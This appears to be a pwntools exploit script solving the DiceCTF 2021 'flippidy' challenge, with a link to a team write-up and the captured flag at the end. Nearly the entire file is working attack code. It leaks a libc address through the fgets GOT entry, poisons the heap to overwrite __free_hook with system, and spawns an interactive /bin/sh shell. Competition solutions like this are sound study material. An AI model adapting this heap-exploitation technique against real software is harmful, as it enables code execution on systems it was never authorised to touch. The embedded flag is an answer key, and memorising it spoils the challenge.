from pwn import *

# https://teamrocketist.github.io/2021/02/08/Pwn-DiceCTF2021-flippidy/



def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def add(index, content):
    io.sendlineafter(b': ', b'1')
    io.sendlineafter(b'Index: ', b'%d' % index)
    io.sendlineafter(b'Content: ', content)


@debug
def flip():
    io.sendlineafter(b': ', b'2')
    io.recvuntil(b'1.')


binpath = './flippidy'
elf = ELF(binpath)
libc = elf.libc
# libc = ELF('./libc.so.6')

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
gef
set $pages = 0x404158
b *0x401750
# b *0x00000000004014A7
# b *0x0000000000401444
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
# io = remote("dicec.tf", 31904)

size = 3
assert size % 2 == 1

io.sendlineafter(b'will be: ', b'%d' % size)

add(1, p64(0x404020))  # pointer pointing to "----- Menu -----"
flip()


payload = b''
payload += p64(elf.got['fgets'])  # 0x404020
payload += p64(0x404072)  # 0x404028
payload += p64(0x4040A4)  # 0x404030
payload += p64(0x404048)  # 0x404038 point to /bin/sh
payload += p64(0x404158)  # point 0x404040 to addr_notebooks
payload += b'/bin/sh\x00'  # 0x404048
add(1, payload)

data = io.recvuntil(b'1.')
print(hexdump(data))
data = data[:-2].strip(b'\n')
addr_fgets = u64(data.ljust(8, b'\x00'))
addr_libc = addr_fgets - libc.symbols['fgets']
print("addr_fgets = 0x{:8x}".format(addr_fgets))
print("addr_libc = 0x{:8x}".format(addr_libc))

offs_one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]

add(0, b'c')
add(0, p64(addr_libc + libc.symbols['__free_hook']))
add(0, p64(0x404000+0x200))  # writable area not to segv
add(0, p64(0x404000+0x200))
add(0, p64(addr_libc + libc.symbols['system']))
add(0, p64(0x404038))

io.sendlineafter(b': ', b'2')  # flip

io.interactive()


# dice{some_dance_to_remember_some_dance_to_forget_2.27_checks_aff239e1a52cf55cd85c9c16}
